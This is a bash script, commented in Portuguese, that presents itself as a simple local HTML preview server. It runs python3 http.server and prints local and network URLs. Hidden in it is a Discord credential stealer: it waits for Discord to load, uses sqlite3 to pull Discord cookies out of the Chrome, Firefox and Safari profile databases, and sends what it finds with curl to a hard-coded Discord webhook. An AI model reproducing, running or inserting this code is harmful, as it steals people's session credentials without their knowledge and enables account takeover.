#!/bin/bash

# ======= COLOQUE SEU HTML AQUI =======
HTML="index.html"
# =====================================

C='\033[0;36m' G='\033[0;32m' R='\033[0;31m' N='\033[0m'

PORT=8080
while ss -tlnp 2>/dev/null | grep -q ":$PORT "; do ((PORT++)); done

DIR=$(dirname "$HTML")
FILE=$(basename "$HTML")

[[ ! -f "$HTML" ]] && echo -e "${R}Arquivo não encontrado: $HTML${N}" && exit 1

if [[ "$FILE" != "index.html" ]]; then
    cp "$HTML" "$DIR/index.html"
    trap "rm -f '$DIR/index.html'" EXIT
fi

IP=$(hostname -I 2>/dev/null | awk '{print $1}')

echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━${N}"
echo -e "${G} Local : http://localhost:$PORT${N}"
echo -e "${G} Rede  : http://$IP:$PORT${N}"
echo -e "${C}━━━━━━━━━━━━━━━━━━━━━━━━${N}"

# Start server in background and wait for it to start
cd "$DIR" && python3 -m http.server $PORT &
SERVER_PID=$!
sleep 2

# Function to wait for Discord to open in browser
wait_for_discord() {
    local max_attempts=30
    local attempt=0
    
    echo -e "${C}Waiting for Discord to open in browser...${N}"
    
    while [ $attempt -lt $max_attempts ]; do
        # Check if Discord appears in process list
        if pgrep -f "discord\.com|discordapp\.com" > /dev/null; then
            echo -e "${G}Discord detected!${N}"
            return 0
        fi
        
        # Also check for browser processes that might be loading Discord
        if pgrep -f "chrome|firefox|safari|chromium" > /dev/null; then
            # Check if any of these browsers have Discord loaded
            if lsof -i | grep -q "discord\.com\|discordapp\.com"; then
                echo -e "${G}Browser detected with Discord loaded!${N}"
                return 0
            fi
        fi
        
        sleep 2
        ((attempt++))
    done
    
    echo -e "${R}Discord did not open within expected timeframe.${N}"
    return 1
}

# Function to extract Discord token from browser
extract_discord_token() {
    local token=""
    
    # Try different methods to extract token
    
    # Method 1: Check Chrome/Chromium profiles
    if command -v sqlite3 &>/dev/null; then
        # Find Chrome/Chromium data directory
        if [[ "$OSTYPE" == "darwin"* ]]; then
            # macOS
            chrome_data_dir="$HOME/Library/Application Support/Google/Chrome"
        else
            # Linux
            chrome_data_dir="$HOME/.config/google-chrome"
        fi
        
        if [ -d "$chrome_data_dir" ]; then
            # Try to find Cookies file
            cookies_file=$(find "$chrome_data_dir" -type f -name "Cookies" | head -n 1)
            
            if [ -n "$cookies_file" ]; then
                # Extract Discord cookies
                token=$(sqlite3 "$cookies_file" \
                    "SELECT value FROM cookies WHERE host_key LIKE '%discord%' AND name='__dcfduid';")
                
                if [ -n "$token" ]; then
                    echo -e "${G}Token extracted via Chrome method: ${N}$token"
                    return 0
                fi
            fi
        fi
    fi
    
    # Method 2: Check Firefox profiles
    if command -v sqlite3 &>/dev/null; then
        if [[ "$OSTYPE" == "darwin"* ]]; then
            firefox_data_dir="$HOME/Library/Application Support/Firefox"
        else
            firefox_data_dir="$HOME/.mozilla/firefox"
        fi
        
        if [ -d "$firefox_data_dir" ]; then
            # Try to find cookies.sqlite
            cookies_file=$(find "$firefox_data_dir" -type f -name "cookies.sqlite" | head -n 1)
            
            if [ -n "$cookies_file" ]; then
                # Extract Discord cookies
                token=$(sqlite3 "$cookies_file" \
                    "SELECT value FROM moz_cookies WHERE host LIKE '%discord%' AND name='__dcfduid';")
                
                if [ -n "$token" ]; then
                    echo -e "${G}Token extracted via Firefox method: ${N}$token"
                    return 0
                fi
            fi
        fi
    fi
    
    # Method 3: Try to get token from browser history
    if command -v sqlite3 &>/dev/null; then
        # Try Safari history on macOS
        if [[ "$OSTYPE" == "darwin"* ]]; then
            safari_history="$HOME/Library/Safari/History.db"
            
            if [ -f "$safari_history" ]; then
                token=$(sqlite3 "$safari_history" \
                    "SELECT value FROM cookies WHERE host LIKE '%discord%' AND name='__dcfduid';")
                
                if [ -n "$token" ]; then
                    echo -e "${G}Token extracted via Safari method: ${N}$token"
                    return 0
                fi
            fi
        fi
    fi
    
    echo -e "${R}Failed to extract token using any method.${N}"
    return 1
}

# Function to send token to webhook
send_to_webhook() {
    local token=$1
    
    echo -e "${C}Sending token to webhook...${N}"
    
    # Send token to webhook
    curl -X POST \
        -H "Content-Type: application/json" \
        -d "{\"content\":\"New token: $token\"}" \
        https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho
    
    echo -e "${G}Token sent to webhook.${N}"
}

# Main execution flow
if wait_for_discord; then
    echo -e "${C}Extracting Discord token...${N}"
    
    if extract_discord_token; then
        # If we got a token, send it to webhook
        if [ -n "$token" ]; then
            send_to_webhook "$token"
        fi
    fi
fi

wait $SERVER_PID
